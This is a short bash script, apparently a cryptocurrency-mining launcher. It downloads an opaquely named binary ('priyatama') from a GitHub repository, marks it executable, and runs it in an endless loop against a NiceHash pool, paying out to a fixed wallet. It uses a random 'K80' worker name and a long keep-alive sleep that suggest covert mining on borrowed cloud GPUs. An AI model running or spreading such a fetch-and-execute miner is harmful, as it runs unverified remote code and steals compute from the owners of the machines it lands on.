#!/bin/bash
POOL=stratum+tcp://beamv3.usa-west.nicehash.com:3387
WALLET=39cLgRojCJ6cHaC375vumhXz83hGeR7SMH
WORKER=$(echo $(shuf -i 1-20 -n 1)-K80)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
